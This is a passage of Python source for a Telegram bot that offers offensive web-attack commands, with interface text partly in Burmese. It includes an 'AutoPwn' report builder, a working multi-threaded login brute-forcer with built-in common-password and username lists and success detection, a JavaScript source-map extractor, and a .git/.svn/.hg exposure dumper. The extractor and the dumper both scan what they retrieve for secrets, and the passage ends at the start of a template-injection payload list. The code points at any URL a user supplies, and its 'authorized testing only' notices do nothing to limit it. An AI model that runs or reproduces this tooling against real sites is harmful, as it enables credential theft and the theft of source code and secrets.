        else:
            risk_level = "🟢 LOW"

        tech_detected = sum(len(v) for v in report["tech"].get("detected",{}).values())
        fuzz_200 = [f for f in report["fuzz"] if f["status"] == 200]

        lines = [
            f"🤖 *AutoPwn Complete — `{domain}`*",
            f"━━━━━━━━━━━━━━━━━━━━",
            f"🎯 Risk Score: `{risk}/100` — {risk_level}",
            f"⏰ Scanned: `{report['scanned_at']}`",
            "",
            f"*📊 Summary:*",
            f"  🔍 Technologies: `{tech_detected}` detected",
            f"  🧪 Paths found: `{len(report['fuzz'])}` (`{len(fuzz_200)}` accessible)",
            f"  🔑 Secrets: `{report['secrets'].get('total', 0)}` found",
            f"  💉 SQLi: `{'VULNERABLE' if report['sqli'].get('total_found',0) else 'Clean'}`",
            f"  🎯 XSS: `{'VULNERABLE' if report['xss'].get('total_found',0) else 'Clean'}`",
            f"  🔬 Params: `{len(report['params'].get('found_params',[]))}` discovered",
            "",
        ]

        if report["vulns"]:
            lines.append("*🚨 Vulnerabilities Found:*")
            for v in report["vulns"]:
                lines.append(f"  {v}")
        else:
            lines.append("*✅ No major vulnerabilities detected*")

        # Tech summary
        tech_detected_dict = report["tech"].get("detected", {})
        if tech_detected_dict:
            key_techs = []
            for cat in ["CMS", "Backend", "JS Framework", "Web Server"]:
                if cat in tech_detected_dict:
                    key_techs.extend(tech_detected_dict[cat][:2])
            if key_techs:
                lines.append(f"\n🔧 Stack: `{'`, `'.join(key_techs[:5])}`")

        lines.append("\n⚠️ _For authorized testing only. Full details above._")

        # Build JSON report
        import io as _io
        report_json = json.dumps(report, indent=2, default=str, ensure_ascii=False)
        report_buf = _io.BytesIO(report_json.encode())

        await msg.edit_text("\n".join(lines), parse_mode='Markdown')

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_dom = re.sub(r'[^\w\-]', '_', domain)
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=report_buf,
            filename=f"autopwn_{safe_dom}_{ts}.json",
            caption=(
                f"📊 *AutoPwn Report — `{domain}`*\n"
                f"Risk: {risk_level} | Score: `{risk}/100`\n"
                f"Vulnerabilities: `{len(report['vulns'])}`"
            ),
            parse_mode='Markdown'
        )

    finally:
        _active_scans.pop(uid, None)


# ══════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════
# 🔐 FEATURE #29 — /bruteforce  Login Brute Force (rate-limit aware)
# ══════════════════════════════════════════════════════════════════════

_COMMON_PASSWORDS = [
    # Top universal
    "123456","password","123456789","12345678","12345","1234567","1234567890",
    "qwerty","abc123","111111","123123","admin","letmein","welcome","monkey",
    "dragon","master","hello","login","pass","test","guest","root","toor",
    "changeme","default","secret","pass123","password1","password123",
    "qwerty123","passw0rd","p@ssword","p@ss123","Password1","Admin1234",
    # Common patterns
    "1q2w3e4r","1q2w3e","zxcvbnm","asdfghjkl","qwertyuiop","0987654321",
    "987654321","654321","123321","112233","121212","696969","555555",
    "444444","333333","222222","11111111","00000000","1234","0000",
    # Service defaults
    "admin123","admin1234","administrator","root123","rootroot","toor123",
    "support","helpdesk","service","operator","manager","supervisor",
    "user","user123","demo","demo123","test123","testing","staging",
    # Web app common
    "wordpress","joomla","drupal","magento","opencart","prestashop",
    "cpanel","plesk","panel","webmaster","webadmin","siteadmin",
    # Names + numbers
    "michael","jennifer","thomas","jessica","charlie","superman","batman",
    "football","baseball","soccer","shadow","sunshine","princess","iloveyou",
    "trustno1","whatever","nothing","access","killer","fuck","fuckyou",
    # Myanmar common
    "myanmar","burma","yangon","mandalay","naypyidaw","mmk","mmuser",
    "admin@123","Admin@123","Pass@123","P@ssw0rd","P@$$w0rd",
    "Passw0rd!","Admin123!","Password!","Welcome1","Welcome123",
    # Year patterns
    "2020","2021","2022","2023","2024","2025",
    "admin2023","admin2024","admin2025","pass2024","pass2025",
    "password2024","password2025",
    # Special patterns
    "qwerty1","abc1234","1234abcd","password!","p@ssword1",
    "monkey123","dragon123","master123","hello123","test1234",
    "user1234","guest123","root1234","admin@1","admin_123",
]

_COMMON_USERNAMES = [
    "admin","administrator","root","user","guest","test","demo","support",
    "manager","operator","webmaster","sysadmin","superuser","moderator",
    "info","contact","mail","postmaster","noreply","no-reply",
    "service","helpdesk","staff","employee","intern","dev","developer",
    "api","system","server","backup","database","db","mysql","postgres",
    "oracle","ftp","ssh","www","web","app","mobile","bot","robot",
    "monitor","nagios","zabbix","ansible","deploy","ci","jenkins",
]

def _bruteforce_sync(login_url: str, username_field: str, password_field: str,
                     usernames: list, passwords: list, progress_q: list) -> dict:
    """Smart login brute force — parallel + JSON API auto-detect + cookie change detection."""
    results = {
        "login_url":        login_url,
        "tested":           0,
        "found":            [],
        "rate_limited":     False,
        "lockout_detected": False,
        "captcha_detected": False,
        "json_api":         False,
        "errors":           [],
    }
    session = requests.Session()
    session.headers.update(_get_headers())
    session.verify = False

    # ── Baseline: failed login response ────────────
    try:
        baseline_resp = session.post(login_url, data={
            username_field: "zz_invalid_user_zz",
            password_field: "zz_invalid_pass_zz"
        }, timeout=10, allow_redirects=True)
        baseline_len  = len(baseline_resp.text)
        baseline_url  = baseline_resp.url
        baseline_code = baseline_resp.status_code
        baseline_cookies = set(baseline_resp.cookies.keys())
        progress_q.append(f"🔐 Baseline: HTTP {baseline_code}, body {baseline_len}B")
    except Exception as e:
        results["errors"].append(f"Baseline failed: {e}")
        return results

    # ── Auto-detect JSON API ───────────────────────
    try:
        json_test = session.post(
            login_url,
            json={username_field: "test", password_field: "test"},
            headers={**_get_headers(), "Content-Type": "application/json"},
            timeout=8
        )
        if json_test.status_code not in (415, 400) and \
           "application/json" in json_test.headers.get("Content-Type",""):
            results["json_api"] = True
            progress_q.append("🔌 JSON API detected — using JSON body")
    except Exception:
        pass

    # ── CAPTCHA detection ──────────────────────────
    captcha_hints = ["captcha","recaptcha","hcaptcha","turnstile","i am not a robot","cf-turnstile"]
    if any(h in baseline_resp.text.lower() for h in captcha_hints):
        results["captcha_detected"] = True
        progress_q.append("⚠️ CAPTCHA detected — brute limited")

    total_attempts = min(len(usernames) * len(passwords), 300)
    consecutive_429 = 0
    lock = threading.Lock()

    def _try_login(uname: str, pwd: str) -> Optional[dict]:
        nonlocal consecutive_429
        login_payload = {username_field: uname, password_field: pwd}
        try:
            if results["json_api"]:
                resp = session.post(
                    login_url, json=login_payload,
                    headers={**_get_headers(), "Content-Type": "application/json"},
                    timeout=10, allow_redirects=True
                )
            else:
                resp = session.post(login_url, data=login_payload,
                                    timeout=10, allow_redirects=True)
                # Fallback to JSON if form rejected
                if resp.status_code in (400, 415, 422):
                    resp = session.post(
                        login_url, json=login_payload,
                        headers={**_get_headers(), "Content-Type": "application/json"},
                        timeout=10, allow_redirects=True
                    )

            # Rate limit
            if resp.status_code == 429:
                with lock:
                    consecutive_429 += 1
                time.sleep(5)
                return None

            with lock:
                consecutive_429 = 0

            # Lockout detection
            lockout_hints = ["account locked","too many attempts","locked out",
                             "suspended","banned","temporarily blocked"]
            if any(h in resp.text.lower() for h in lockout_hints):
                results["lockout_detected"] = True
                return None

            # Success detection — multi-signal
            body_len_diff = abs(len(resp.text) - baseline_len)
            url_changed   = resp.url != baseline_url
            code_changed  = resp.status_code != baseline_code
            new_cookies   = set(resp.cookies.keys()) - baseline_cookies

            success_hints = ["dashboard","logout","welcome","profile","my account",
                             "sign out","settings","account","home","admin",
                             "\"success\":true", '"authenticated":true',
                             '"token":', '"access_token":']
            hint_found = any(h in resp.text.lower() for h in success_hints)

            # JSON API success detection
            json_success = False
            try:
                rj = resp.json()
                json_success = bool(
                    rj.get("token") or rj.get("access_token") or
                    rj.get("success") or rj.get("user") or
                    (rj.get("status") == "success")
                )
            except Exception:
                pass

            is_success = (
                json_success or
                (url_changed and resp.status_code in (200, 302)) or
                hint_found or
                bool(new_cookies) or
                (body_len_diff > 300 and code_changed)
            )

            if is_success:
                return {
                    "username": uname, "password": pwd,
                    "status": resp.status_code, "url": resp.url,
                    "new_cookies": list(new_cookies)
                }
        except Exception as e:
            results["errors"].append(str(e)[:60])
        return None

    # ── Parallel credential testing (3 threads) ────
    import threading
    pairs = [(u, p) for u in usernames for p in passwords][:total_attempts]
    tested = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as ex:
        for result_item in ex.map(lambda a: _try_login(*a), pairs):
            tested += 1
            results["tested"] = tested
            if tested % 20 == 0:
                progress_q.append(
                    f"🔐 [{tested}/{total_attempts}] Testing... | Found: {len(results['found'])} | "
                    f"{'⚠️ CAPTCHA' if results['captcha_detected'] else ''}")
            if result_item:
                results["found"].append(result_item)
                progress_q.append(
                    f"🔓 FOUND: `{result_item['username']}`:`{result_item['password']}`")
            if results["rate_limited"] or results["lockout_detected"]:
                break
            if consecutive_429 >= 5:
                results["rate_limited"] = True
                progress_q.append("🚫 Rate limit hit — stopping")
                break
            time.sleep(0.4)   # Polite delay

    return results


async def cmd_bruteforce(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/bruteforce <url> [user_field] [pass_field] [username]
    Rate-limit aware login brute force tester.
    """
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    args = context.args or []
    if not args:
        await update.effective_message.reply_text(
            "🔐 *Login Brute Force Tester*\n\n"
            "```\n/bruteforce <login_url> [user_field] [pass_field] [username]\n```\n\n"
            "*Examples:*\n"
            "  `/bruteforce https://site.com/login`\n"
            "  `/bruteforce https://site.com/login email password admin`\n\n"
            "*Defaults:* field=`username`, pass=`password`\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    url          = args[0]
    user_field   = args[1] if len(args) > 1 else "username"
    pass_field   = args[2] if len(args) > 2 else "password"
    target_user  = args[3] if len(args) > 3 else None

    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    # ── Concurrent scan limit ─────────────────────
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            f"သို့မဟုတ် `/stop` နှိပ်ပါ",
            parse_mode='Markdown')
        return
    _active_scans[uid] = "Brute force"

    # Use custom wordlist if uploaded
    usernames = [target_user] if target_user else (
        context.user_data.get("custom_usernames") or _COMMON_USERNAMES)
    passwords = (
        context.user_data.get("custom_passwords") or _COMMON_PASSWORDS)

    msg = await update.effective_message.reply_text(
        f"🔐 *Brute Force — `{urlparse(url).hostname}`*\n\n"
        f"Testing `{len(usernames)}` users × `{len(passwords)}` passwords\n"
        f"Fields: `{user_field}` / `{pass_field}`\n⏳ Starting...",
        parse_mode='Markdown'
    )

    # Track scan in DB
    async with db_lock:
        _db = _load_db_sync()
        track_scan(_db, uid, "BruteForce", url)
        _save_db_sync(_db)

    progress_q = []

    async def _show_progress():
        last = 0
        while True:
            await asyncio.sleep(4)
            if len(progress_q) > last:
                latest = progress_q[-1]
                try:
                    await msg.edit_text(
                        f"🔐 *Brute Force — `{urlparse(url).hostname}`*\n\n{latest}",
                        parse_mode='Markdown'
                    )
                except Exception:
                    pass
                last = len(progress_q)

    prog_task = asyncio.create_task(_show_progress())
    try:
        result = await asyncio.to_thread(
            _bruteforce_sync, url, user_field, pass_field, usernames, passwords, progress_q
        )
    finally:
        prog_task.cancel()
        _active_scans.pop(uid, None)

    domain = urlparse(url).hostname
    lines  = [f"🔐 *Brute Force Complete — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━"]

    if result["found"]:
        lines.append(f"🔓 *CREDENTIALS FOUND: {len(result['found'])}*")
        for f in result["found"]:
            lines.append(f"  👤 `{f['username']}` : `{f['password']}`")
    else:
        lines.append("✅ No valid credentials found")

    lines += [
        f"\n📊 *Stats:*",
        f"  Tested: `{result['tested']}` combos",
        f"  Rate limited: `{'Yes ⚠️' if result['rate_limited'] else 'No'}`",
        f"  Lockout: `{'Yes 🔒' if result['lockout_detected'] else 'No'}`",
        f"  CAPTCHA: `{'Yes 🤖' if result['captcha_detected'] else 'No'}`",
        "\n⚠️ _Authorized testing only_"
    ]
    await msg.edit_text("\n".join(lines), parse_mode='Markdown')

    import io as _io
    _rj = json.dumps(result, indent=2, default=str, ensure_ascii=False)
    _rb = _io.BytesIO(_rj.encode())
    _ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    _sd = re.sub(r'[^\w\-]', '_', urlparse(url).hostname)
    await context.bot.send_document(
        chat_id=update.effective_chat.id, document=_rb,
        filename=f"bruteforce_{_sd}_{_ts}.json",
        caption=f"🔐 Bruteforce — `{urlparse(url).hostname}`\nFound: `{len(result['found'])}`", parse_mode='Markdown'
    )
    _active_scans.pop(uid, None)


# ══════════════════════════════════════════════════════════════════════
# ══════════════════════════════════════════════════════════════════════

def _sourcemap_sync(url: str, progress_q: list) -> dict:
    """Find and extract JS source maps → original source code."""
    results = {
        "maps_found": [],
        "sources_extracted": [],
        "secrets_in_source": [],
        "total_source_files": 0,
        "zip_buffer": None,
    }
    session = requests.Session()
    session.headers.update(_get_headers())
    session.verify = False
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    # ── Step 1: Find all JS files ──────────────────
    progress_q.append("🗺️ Fetching page to find JS files...")
    try:
        resp = session.get(url, timeout=15, allow_redirects=True)
        soup = BeautifulSoup(resp.text, _BS_PARSER)
    except Exception as e:
        results["error"] = str(e)
        return results

    js_urls = []
    for tag in soup.find_all('script', src=True):
        js_src = tag['src']
        if not js_src.startswith('http'):
            js_src = urljoin(url, js_src)
        js_urls.append(js_src)

    # Also try common bundle names
    common_bundles = [
        "/static/js/main.js", "/static/js/bundle.js", "/assets/js/app.js",
        "/js/app.js", "/dist/app.js", "/build/static/js/main.chunk.js",
        "/js/vendor.js", "/_next/static/chunks/main.js",
    ]
    for path in common_bundles:
        full = base + path
        if full not in js_urls:
            js_urls.append(full)

    progress_q.append(f"🗺️ Found {len(js_urls)} JS files — checking for .map references...")

    # ── Step 2: Find .map references ──────────────
    import zipfile as _zf, io as _io

    zip_buf = _io.BytesIO()
    total_files = 0

    with _zf.ZipFile(zip_buf, 'w', _zf.ZIP_DEFLATED) as zf:
        for js_url in js_urls[:20]:  # limit to 20 JS files
            try:
                safe_ok, _ = is_safe_url(js_url)
                if not safe_ok:
                    continue
                jr = session.get(js_url, timeout=12)
                if jr.status_code != 200:
                    continue

                js_content = jr.text

                # Look for sourceMappingURL comment
                map_url = None
                for line in js_content.split('\n')[-5:]:
                    if '//# sourceMappingURL=' in line:
                        map_ref = line.split('sourceMappingURL=')[-1].strip()
                        if map_ref.startswith('http'):
                            map_url = map_ref
                        elif not map_ref.startswith('data:'):
                            map_url = urljoin(js_url, map_ref)
                        break

                # Also try appending .map directly
                map_urls_to_try = []
                if map_url:
                    map_urls_to_try.append(map_url)
                map_urls_to_try.append(js_url + '.map')

                for murl in map_urls_to_try:
                    safe_ok2, _ = is_safe_url(murl)
                    if not safe_ok2:
                        continue
                    try:
                        mr = session.get(murl, timeout=10)
                        if mr.status_code != 200:
                            continue

                        map_data = mr.json()
                        sources  = map_data.get('sources', [])
                        contents = map_data.get('sourcesContent', [])

                        results["maps_found"].append({
                            "map_url": murl,
                            "source_count": len(sources),
                        })
                        progress_q.append(f"🗺️ Map found: `{murl.split('/')[-1]}` → {len(sources)} sources")

                        # Extract all source files
                        for idx, (src_path, src_content) in enumerate(zip(sources, contents or [])):
                            if not src_content:
                                continue
                            # Clean path
                            safe_name = re.sub(r'[^\w/.\-]', '_', src_path.lstrip('./'))
                            safe_name = safe_name[:200]
                            zf.writestr(f"sourcemap/{safe_name}", src_content)
                            results["sources_extracted"].append(src_path)
                            total_files += 1

                            # Quick secret scan on source
                            for stype, (pattern, risk) in list(_SECRET_PATTERNS.items())[:20]:
                                try:
                                    if re.search(pattern, src_content, re.I):
                                        results["secrets_in_source"].append({
                                            "type": stype, "risk": risk,
                                            "file": src_path,
                                        })
                                except re.error:
                                    pass

                        break  # found map, no need to try .map fallback

                    except (ValueError, Exception):
                        continue

            except Exception:
                continue

    results["total_source_files"] = total_files
    results["zip_buffer"] = zip_buf if total_files > 0 else None
    progress_q.append(f"🗺️ Done — {total_files} source files extracted")
    return results


async def cmd_sourcemap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/sourcemap <url> — Extract JS source maps → original source code"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if not context.args:
        await update.effective_message.reply_text(
            "🗺️ *JS Source Map Extractor*\n\n"
            "```\n/sourcemap <url>\n```\n\n"
            "*What it does:*\n"
            "  ① JS files ထဲက `.map` references ရှာ\n"
            "  ② Source map download → original source code ထုတ်\n"
            "  ③ ZIP file ထဲ original src files ထည့်\n"
            "  ④ Secret keys/tokens scan လုပ်\n\n"
            "*Example:* `/sourcemap https://site.com`\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    url = context.args[0]
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    # ── Concurrent scan limit ─────────────────────
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            f"သို့မဟုတ် `/stop` နှိပ်ပါ",
            parse_mode='Markdown')
        return
    _active_scans[uid] = "SourceMap"

    domain = urlparse(url).hostname
    msg = await update.effective_message.reply_text(
        f"🗺️ *Source Map Scan — `{domain}`*\n\n⏳ Scanning JS files...",
        parse_mode='Markdown'
    )
    progress_q = []

    async def _progress():
        last = 0
        while True:
            await asyncio.sleep(3)
            if len(progress_q) > last:
                try:
                    await msg.edit_text(
                        f"🗺️ *Source Map Scan — `{domain}`*\n\n{progress_q[-1]}",
                        parse_mode='Markdown'
                    )
                except Exception:
                    pass
                last = len(progress_q)

    task = asyncio.create_task(_progress())
    try:
        result = await asyncio.to_thread(_sourcemap_sync, url, progress_q)
    finally:
        task.cancel()
        _active_scans.pop(uid, None)

    maps    = result.get("maps_found", [])
    sources = result.get("sources_extracted", [])
    secrets = result.get("secrets_in_source", [])

    lines = [f"🗺️ *Source Map Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━"]

    if maps:
        lines.append(f"\n🎯 *Source Maps Found: {len(maps)}*")
        for m in maps:
            lines.append(f"  📄 `{m['map_url'].split('/')[-1]}` — `{m['source_count']}` source files")
        lines.append(f"\n📁 Total source files extracted: `{result['total_source_files']}`")

        if sources[:5]:
            lines.append("\n*Sample files:*")
            for s in sources[:5]:
                lines.append(f"  `{s}`")
            if len(sources) > 5:
                lines.append(f"  _...{len(sources)-5} more in ZIP_")

        if secrets:
            lines.append(f"\n*🔑 Secrets in source: {len(secrets)}*")
            seen_types = set()
            for s in secrets:
                if s["type"] not in seen_types:
                    lines.append(f"  {s['risk']} `{s['type']}` in `{s['file'].split('/')[-1]}`")
                    seen_types.add(s["type"])
    else:
        lines.append("\n❌ No source maps found")
        lines.append("_Site may use obfuscation or no source maps deployed_")

    lines.append("\n⚠️ _Authorized testing only_")
    await msg.edit_text("\n".join(lines), parse_mode='Markdown')

    # Send ZIP if we have extracted files
    if result.get("zip_buffer") and result["total_source_files"] > 0:
        result["zip_buffer"].seek(0)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=result["zip_buffer"],
            filename=f"sourcemap_{domain}_{ts}.zip",
            caption=f"🗺️ Source Map Extract — `{domain}`\n"
                    f"{result['total_source_files']} source files from {len(maps)} map(s)",
            parse_mode='Markdown'
        )
        _active_scans.pop(uid, None)


# ══════════════════════════════════════════════════════════════════════
# 🔓 FEATURE #36 — /gitexposed  Git Directory Exposure Finder
# ══════════════════════════════════════════════════════════════════════

_GIT_PATHS = [
    "/.git/HEAD",
    "/.git/config",
    "/.git/index",
    "/.git/COMMIT_EDITMSG",
    "/.git/logs/HEAD",
    "/.git/refs/heads/main",
    "/.git/refs/heads/master",
    "/.git/refs/heads/develop",
    "/.git/description",
    "/.git/packed-refs",
    "/.git/info/exclude",
    "/.gitignore",
    "/.gitmodules",
    "/.gitattributes",
    "/.git/FETCH_HEAD",
    "/.git/ORIG_HEAD",
    "/.git/objects/info/packs",
]

_SVN_PATHS = ["/.svn/entries", "/.svn/wc.db", "/.svn/format"]
_HG_PATHS  = ["/.hg/store/00manifest.i", "/.hg/requires", "/.hgignore"]


def _gitexposed_sync(url: str, progress_q: list) -> dict:
    """Check for exposed .git directory and extract repo info."""
    results = {
        "git_exposed": False,
        "svn_exposed": False,
        "hg_exposed":  False,
        "accessible_files": [],
        "repo_info": {},
        "secrets_found": [],
        "branch_names": [],
        "zip_buffer": None,
    }
    session = requests.Session()
    session.headers.update(_get_headers())
    session.verify = False
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    # ── Step 1: Check .git exposure ───────────────
    progress_q.append("🔓 Checking .git directory exposure...")
    for path in _GIT_PATHS:
        try:
            r = session.get(base + path, timeout=8)
            if r.status_code == 200 and r.text.strip():
                results["accessible_files"].append({
                    "path": path,
                    "size": len(r.text),
                    "preview": r.text[:100].strip(),
                    "content": r.text,
                })
                if path == "/.git/HEAD":
                    results["git_exposed"] = True
                    branch = r.text.strip().replace("ref: refs/heads/", "")
                    results["repo_info"]["current_branch"] = branch
                    progress_q.append(f"🔴 .git EXPOSED! Branch: `{branch}`")
                elif path == "/.git/config":
                    # Extract remote URL
                    for line in r.text.split('\n'):
                        if 'url = ' in line:
                            results["repo_info"]["remote_url"] = line.split('url = ')[-1].strip()
                elif "refs/heads" in path and r.status_code == 200:
                    branch_name = path.split("refs/heads/")[-1]
                    results["branch_names"].append(branch_name)
        except Exception as _e:
            logging.debug("Scan error: %s", _e)

    # ── Step 2: SVN check ─────────────────────────
    progress_q.append("🔓 Checking SVN exposure...")
    for path in _SVN_PATHS:
        try:
            r = session.get(base + path, timeout=8)
            if r.status_code == 200:
                results["svn_exposed"] = True
                results["accessible_files"].append({"path": path, "size": len(r.text), "content": r.text})
                progress_q.append(f"🔴 SVN EXPOSED: `{path}`")
                break
        except Exception as _e:
            logging.debug("Scan error: %s", _e)

    # ── Step 3: Mercurial check ───────────────────
    progress_q.append("🔓 Checking Mercurial (.hg) exposure...")
    for path in _HG_PATHS:
        try:
            r = session.get(base + path, timeout=8)
            if r.status_code == 200:
                results["hg_exposed"] = True
                results["accessible_files"].append({"path": path, "size": len(r.text), "content": r.text})
                progress_q.append(f"🔴 Mercurial EXPOSED: `{path}`")
                break
        except Exception as _e:
            logging.debug("Scan error: %s", _e)

    if not results["git_exposed"]:
        progress_q.append("✅ No VCS exposure found")
        return results

    # ── Step 4: Dump accessible git objects ───────
    progress_q.append("🔓 Dumping accessible git files...")

    import zipfile as _zf, io as _io
    zip_buf = _io.BytesIO()
    with _zf.ZipFile(zip_buf, 'w', _zf.ZIP_DEFLATED) as zf:
        for file_info in results["accessible_files"]:
            safe_name = file_info["path"].lstrip("/").replace("/", "_")
            zf.writestr(f"git_dump/{safe_name}", file_info["content"])

        # Try to get COMMIT_EDITMSG for recent commit message
        try:
            r = session.get(base + "/.git/COMMIT_EDITMSG", timeout=8)
            if r.status_code == 200:
                results["repo_info"]["last_commit_msg"] = r.text.strip()[:100]
                zf.writestr("git_dump/COMMIT_EDITMSG", r.text)
        except Exception as _e:
            logging.debug("Scan error: %s", _e)

        # Try to get logs/HEAD for commit history
        try:
            r = session.get(base + "/.git/logs/HEAD", timeout=8)
            if r.status_code == 200:
                commits = []
                for line in r.text.split('\n')[:10]:
                    parts = line.split('\t')
                    if len(parts) >= 2:
                        commits.append(parts[-1][:80])
                results["repo_info"]["recent_commits"] = commits
                zf.writestr("git_dump/logs_HEAD", r.text)
        except Exception as _e:
            logging.debug("Scan error: %s", _e)

    # ── Step 5: Scan config for secrets ───────────
    progress_q.append("🔓 Scanning git files for secrets...")
    for file_info in results["accessible_files"]:
        content = file_info.get("content", "")
        for stype, (pattern, risk) in list(_SECRET_PATTERNS.items())[:30]:
            try:
                if re.search(pattern, content, re.I):
                    results["secrets_found"].append({
                        "type": stype, "risk": risk,
                        "file": file_info["path"],
                    })
            except re.error:
                pass

    results["zip_buffer"] = zip_buf
    progress_q.append(f"🔓 Done — {len(results['accessible_files'])} files dumped")
    return results


async def cmd_gitexposed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/gitexposed <url> — Check for exposed .git / .svn / .hg directories"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if not context.args:
        await update.effective_message.reply_text(
            "🔓 *Git Exposure Finder*\n\n"
            "```\n/gitexposed <url>\n```\n\n"
            "*What it checks:*\n"
            "  ① `.git/HEAD` `.git/config` `.git/index`\n"
            "  ② Git log / commit history / branch names\n"
            "  ③ `.svn/` Subversion exposure\n"
            "  ④ `.hg/` Mercurial exposure\n"
            "  ⑤ Secret scan on exposed files\n"
            "  ⑥ Full dump as ZIP download\n\n"
            "*Example:* `/gitexposed https://site.com`\n"
            "⚠️ _Authorized testing only_",
            parse_mode='Markdown'
        )
        return

    url = context.args[0]
    if not url.startswith('http'): url = 'https://' + url
    safe_ok, reason = is_safe_url(url)
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    # ── Concurrent scan limit ─────────────────────
    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — ပြီးဆုံးဖို့ စောင့်ပါ\n"
            f"သို့မဟုတ် `/stop` နှိပ်ပါ",
            parse_mode='Markdown')
        return
    _active_scans[uid] = "GitExposed"

    domain = urlparse(url).hostname
    msg = await update.effective_message.reply_text(
        f"🔓 *Git Exposure — `{domain}`*\n\n⏳ Checking VCS exposure...",
        parse_mode='Markdown'
    )
    progress_q = []

    async def _progress():
        last = 0
        while True:
            await asyncio.sleep(3)
            if len(progress_q) > last:
                try:
                    await msg.edit_text(
                        f"🔓 *Git Exposure — `{domain}`*\n\n{progress_q[-1]}",
                        parse_mode='Markdown'
                    )
                except Exception:
                    pass
                last = len(progress_q)

    task = asyncio.create_task(_progress())
    try:
        result = await asyncio.to_thread(_gitexposed_sync, url, progress_q)
    finally:
        task.cancel()
        _active_scans.pop(uid, None)

    lines = [f"🔓 *Git Exposure Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━"]

    any_exposed = result["git_exposed"] or result["svn_exposed"] or result["hg_exposed"]

    if result["git_exposed"]:
        lines.append("🔴 *`.git` DIRECTORY EXPOSED!*")
        info = result.get("repo_info", {})
        if info.get("current_branch"):
            lines.append(f"  🌿 Branch: `{info['current_branch']}`")
        if info.get("remote_url"):
            lines.append(f"  🔗 Remote: `{info['remote_url']}`")
        if info.get("last_commit_msg"):
            lines.append(f"  📝 Last commit: `{info['last_commit_msg']}`")
        if result.get("branch_names"):
            lines.append(f"  🌿 Branches: `{'`, `'.join(result['branch_names'])}`")
        if info.get("recent_commits"):
            lines.append("\n  *Recent commits:*")
            for c in info["recent_commits"][:3]:
                lines.append(f"    • `{c[:60]}`")

    if result["svn_exposed"]:
        lines.append("🔴 *`.svn` SVN DIRECTORY EXPOSED!*")

    if result["hg_exposed"]:
        lines.append("🔴 *`.hg` Mercurial EXPOSED!*")

    if not any_exposed:
        lines.append("✅ No VCS directory exposure found")
        lines.append("_`.git` `.svn` `.hg` all properly protected_")

    if result.get("accessible_files"):
        lines.append(f"\n📁 Accessible files: `{len(result['accessible_files'])}`")
        for f in result["accessible_files"][:6]:
            lines.append(f"  • `{f['path']}` ({f['size']}B)")

    if result.get("secrets_found"):
        secrets = result["secrets_found"]
        lines.append(f"\n*🔑 Secrets in git files: {len(secrets)}*")
        seen = set()
        for s in secrets:
            if s["type"] not in seen:
                lines.append(f"  {s['risk']} `{s['type']}`")
                seen.add(s["type"])

    lines.append("\n⚠️ _Authorized testing only_")
    await msg.edit_text("\n".join(lines), parse_mode='Markdown')

    if result.get("zip_buffer") and any_exposed:
        result["zip_buffer"].seek(0)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=result["zip_buffer"],
            filename=f"gitdump_{domain}_{ts}.zip",
            caption=f"🔓 Git Dump — `{domain}`\n"
                    f"{len(result['accessible_files'])} files extracted",
            parse_mode='Markdown'
        )
        _active_scans.pop(uid, None)



# ╔══════════════════════════════════════════════════════════════╗
# ║   NEW SCANNERS v28.1 — SSTI / CORS / Open Redirect / LFI   ║
# ╚══════════════════════════════════════════════════════════════╝

# ══════════════════════════════════════════════════
# 🔥 /ssti — Server-Side Template Injection Scanner
# ══════════════════════════════════════════════════

_SSTI_PAYLOADS = [
    # ── Detection probes (math that shouldn't execute normally) ──
    ("{{7*7}}",          "49",     "Jinja2/Twig"),
    ("${7*7}",           "49",     "FreeMarker/Velocity"),
    ("#{7*7}",           "49",     "Ruby ERB/Thymeleaf"),
    ("<%= 7*7 %>",       "49",     "Ruby ERB"),
    ("{{7*'7'}}",        "7777777","Jinja2"),
    ("${{7*7}}",         "49",     "Spring/Thymeleaf"),
    ("{7*7}",            "49",     "Smarty"),
